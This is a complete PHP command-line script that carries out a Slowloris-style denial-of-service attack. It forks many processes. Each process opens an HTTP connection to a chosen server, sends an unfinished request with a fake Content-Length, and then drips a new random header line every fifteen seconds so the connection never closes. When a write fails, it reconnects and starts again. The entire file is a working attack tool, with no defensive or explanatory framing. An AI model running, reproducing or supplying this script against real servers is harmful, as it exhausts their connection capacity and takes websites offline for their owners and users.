#! /usr/bin/env php
<?php

function usage($argv)
{
    print "Usage: ./{$argv[0]} <number of processes> <server> [host]\n";
    die();
}

function attack_get($server, $host)
{
    $request  = "GET / HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
    $request .= "Accept: *.*\r\n";
    $request .= "X-a: " . rand(1, 10000) . "\r\n";

    $sockfd = fsockopen($server, 80, $errno, $errstr);
    if ($sockfd) {
        fwrite($sockfd, $request);

        while (true) {
            if (fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n")) {
                echo ".";
                sleep(15);
            } else {
                $sockfd = fsockopen($server, 80, $errno, $errstr);
                if ($sockfd) {
                    echo "\nGet attack failed to sent...\n";
                    fwrite($sockfd, $request);
                }
            }
        }
    } else {
        echo "{$errno}: {$errstr}";
    }
}

function main($argc, $argv)
{
    $status = 1;

    if ($argc == 3) {
        $argv[3] = $argv[2];
    } else if ($argc < 4) {
        usage($argv);
    }

    $pids = array();

    for ($i = 0; $i < $argv[1]; $i++) {
        $pid = pcntl_fork();

        if ($pid == -1) {
            die("Error forking!\n");
        } elseif ($pid == 0) {
            //child process
            attack_get($argv[2], $argv[3]);
        } else {
            //parent process
            $pids[] = $pid;
        }
    }

    foreach ($pids as $pid) {
        pcntl_waitpid($pid, $status);
    }
}


main($argc, $argv);